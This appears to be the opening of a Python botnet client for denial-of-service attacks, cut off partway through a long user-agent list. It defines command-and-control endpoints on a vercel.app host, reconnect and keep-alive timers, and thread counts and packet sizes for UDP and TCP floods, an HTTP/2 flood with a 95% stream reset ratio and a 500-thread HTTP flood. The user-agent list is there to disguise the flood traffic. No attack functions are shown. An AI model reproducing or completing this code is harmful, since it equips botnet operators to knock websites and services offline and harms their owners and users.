import threading
import time
import signal
import sys
import platform
import socket
import ssl
import random
import uuid
import string
import urllib.parse
import urllib.request
import os
import subprocess
import http.client as httplib
import asyncio
import aiohttp
import concurrent.futures
import struct
import requests
import socks
import paramiko
import h2
from h2.connection import H2Connection
from h2.events import (
    RequestReceived, StreamEnded, ConnectionTerminated, SettingsAcknowledged,
    StreamReset, WindowUpdated, RemoteSettingsChanged
)
from h2.errors import ErrorCodes
from h2.settings import SettingCodes

C2_IP_URL = "https://ipvariant.vercel.app/ipl"
C2_PORT_URL = "https://ipvariant.vercel.app/port"
RECONNECT_DELAY = 15
SOCKET_TIMEOUT = 10
BOT_KEEP_ALIVE_INTERVAL = 180
HTTP_TIMEOUT = 10
SWIFTUDP_THREAD_COUNT = 250
SWIFTUDP_PACKET_SIZE_MIN = 1
SWIFTUDP_PACKET_SIZE_MAX = 32
SWIFTUDP_SOCKET_SEND_DELAY = 0.00000001
HOME_TCP_THREAD_COUNT = 250
HOME_UDP_THREAD_COUNT = 250
HOME_UDP_PAYLOAD_SIZE_MIN = 64
HOME_UDP_PAYLOAD_SIZE_MAX = 1024
HOME_FLOOD_SEND_DELAY = 0.000001
HOME_TCP_CONNECT_TIMEOUT = 1.5
HTTP2_V2_THREAD_COUNT = 200
HTTP2_V2_STREAMS_PER_BURST = 200
HTTP2_V2_RESET_RATIO = 0.95
HTTP2_V2_CONNECTION_TIMEOUT = 5
HTTP2_V2_TLS_HANDSHAKE_TIMEOUT = 4
HTTP2_V2_INTER_BURST_DELAY_MIN = 0.005
HTTP2_V2_INTER_BURST_DELAY_MAX = 0.05
HTTP2_V2_SOCKET_RCVBUF_SIZE = 65536
HTTP2_V2_WINDOW_INCREMENT = 65535
SWIFTTCP_FLOOD_THREAD_COUNT = 250
SWIFTTCP_PACKET_SIZE_MIN = 1
SWIFTTCP_PACKET_SIZE_MAX = 32
SWIFTTCP_SOCKET_SEND_DELAY = 0.00000001
HTTP_MIX_THREAD_COUNT = 500
HTTP_MIX_REQUEST_TIMEOUT = 2
HTTP_MIX_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0",
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9',
    'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17',
    'Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4',
    'Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4',
    'Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
    'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/7.1.7 Safari/537.85.16',
    'Mozilla/5.0 (Windows NT 6.0; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4',
    'Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; KFTT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12D508 Safari/600.1.4',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0',
    'Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53',
    'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.10 (KHTML, like Gecko) Version/8.0.4 Safari/600.4.10',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2',
    'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12H321 Safari/600.1.4',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; rv:11.0) like Gecko',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safari/600.1.4',
    'Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53',
    'Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; ARM; Trident/7.0; Touch; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MDDCJS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4',
    'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFASWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H321 Safari/600.1.4',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Linux; U; Android 4.0.4; en-us; KFJWI Build/IMM76D) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safari/9537.53',
    'Mozilla/5.0 (X11; CrOS armv7l 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0',
    'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56',
    'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSOWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3',
    'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 8_1_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B435 Safari/600.1.4',
    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240',
    'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; LCJB; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MDDRJS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFAPWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko',
    'Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; KFOT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 6_1_3 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B329 Safari/8536.25',
    'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFARWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; ASU2JS; rv:11.0) like Gecko',
    'Mozilla/5.0 (iPad; CPU OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A405 Safari/600.1.4',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/7.0.5 Safari/537.77.4',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; yie11; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko',
    'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/8.0.57838 Mobile/12H321 Safari/600.1.4',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0',
    'Mozilla/5.0 (Windows NT 10.0; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MAGWJS; rv:11.0) like Gecko',
    'Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/7.1.5 Safari/537.85.14',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NP06; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.8 (KHTML, like Gecko) Version/8.0.3 Safari/600.4.8',
    'Mozilla/5.0 (iPad; CPU OS 7_0_6 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B651 Safari/9537.53',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/7.1.3 Safari/537.85.12',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/27.0.1453 Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A365 Safari/600.1.4',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; rv:39.0) Gecko/20100101 Firefox/39.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12H143 Safari/600.1.4',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:39.0) Gecko/20100101 Firefox/39.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321',
    'Mozilla/5.0 (iPad; CPU OS 7_0_3 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B511 Safari/9537.53',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.1.17 (KHTML, like Gecko) Version/7.1 Safari/537.85.10',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/7.1.2 Safari/537.85.11',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; ASU2JS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36',
    'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.1',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MDDCJS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.3; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) Qt/4.8.5 Safari/534.34',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b',
    'Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0',
    'Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H143 Safari/600.1.4',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 7262.52.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.86 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MDDCJS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.4.10 (KHTML, like Gecko) Version/7.1.4 Safari/537.85.13',
    'Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.0.0 Safari/538.1',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MALNJS; rv:11.0) like Gecko',
    'Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12F69 Safari/600.1.4',
    'Mozilla/5.0 (Android; Tablet; rv:40.0) Gecko/40.0 Firefox/40.0',
